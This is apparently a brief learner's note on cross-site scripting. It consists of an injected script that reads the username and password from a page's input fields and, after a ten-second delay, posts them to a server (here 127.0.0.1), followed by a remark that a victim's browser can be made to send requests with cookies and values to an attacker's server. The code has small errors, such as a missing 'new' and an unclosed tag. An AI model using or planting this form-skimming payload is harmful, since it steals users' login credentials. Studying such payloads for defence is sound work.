<script>
function helper() {
	var xhttp = XMLHttpRequest();
	var obj = document.getElementsByTagName('input');
	var username = obj[0].value;
	var password = obj[1].value;
	
	xhttp.open('post','http://127.0.0.1/test',true); //request
	xhttp.send('username: '+ username + ' password: '+password); //send the data
}
setTimeout(helper,10000); //invoke the method after 10secs
<script>

things learned,

we can create our own request and make the victim browser to send it to our server or anywhere, with all cookies, values in a given time.

